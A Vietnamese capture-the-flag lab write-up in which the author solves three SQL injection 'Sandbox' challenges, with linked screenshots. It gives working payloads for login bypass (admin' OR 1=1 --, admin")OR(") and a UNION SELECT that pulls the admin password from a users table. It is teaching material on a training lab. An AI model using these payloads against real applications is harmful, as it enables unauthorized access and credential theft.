Đề bài cho một form đăng nhập như sau:

![1](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/1.jpg?raw=true)

Ở phía dưới sẽ là chỉ dẫn khai thác

![2](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/2.jpg?raw=true)

> Chú ý: Bản chất của `Injection` là khiến cho hệ thống hiểu lầm `user input` là các `instruction`

Sử dụng dấu comment trong sql là `--` để bỏ qua phần còn lại của câu truy vấn như sau:

![3](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/3.jpg?raw=true)

> Hoăc: admin' OR 1=1 #

> SELECT \* FROM users WHERE username='admin' OR 1=1 -- ' AND password='hihi'

Dump database thành công

![4](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/4.jpg?raw=true)

Bây giờ tiếp tục với level 2 với thử thách tương tự , tôi thử với `username input` như sau: `admin" --`

- Sau đó tôi nhìn xuống phần lệnh ở dưới và tiếp tục phán đoán `SELECT * FROM users WHERE username=LOWER("admin" -- ") AND password=MD5("")`

- Bây giờ tôi sẽ tìm cách thoát khỏi cặp ngoặc của lệnh `LOWER` như sau: `admin") --`

  ![6](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/6.jpg?raw=true)

  > SELECT \* FROM users WHERE username=LOWER("admin") --") AND password=MD5("")

- Bây giờ rất quen thuộc sử dụng thêm toán tử OR để làm cho điều kiện `WHERE` trở lên luôn đúng

  > admin")OR("

  - Và bùm database đã được dump ra

  ![7](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/7.jpg?raw=true)

  ![8](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/8.jpg?raw=true)

Thử thách cuối cùng của phần `Sandbox` lần này là sử dụng câu lệnh `Union` để lấy được `password` của `username` là `admin`, tôi sẽ nhập để xem phần `SELECT` đằng trước là gì

![9](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/9.jpg?raw=true)

- Có thể thấy đằng trước là `SELECT * FROM news WHERE content LIKE '%admin%'` lấy ra id và nội dung của bài post, nó sẽ trả về là 2 cột
- Do câu lệnh `UNION` để có thể kết hợp được thì số lượng cột trả về cũng phải giống nhau và cùng kiểu dữ liệu nên tôi sẽ thoát dấu nháy và lấy ra `username` và `password` như sau:

  > %' UNION SELECT username , password from users WHERE username = 'admin'

  ![10](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/10.jpg?raw=true)

- Có thể thấy nó trả về những 4 row nhưng yêu cầu chỉ in ra `password` của `admin` nên tôi sẽ nghĩ đến việc bỏ qua các bản ghi của câu select đầu và giới hạn chỉ in ra duy nhất 1 bản ghi như sau:
  > %' UNION SELECT username , password from users WHERE username = 'admin' LIMIT 1 OFFSET 3 --

Và done bài cuối cùng

![11](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/11.jpg?raw=true)

![12](https://github.com/Giangattt123/C4ptur3_Th3_Fl4g/blob/master/CyberjutsuLab/SQL-Injection/SQL-Injection-1/Sandbox/images/12.jpg?raw=true)
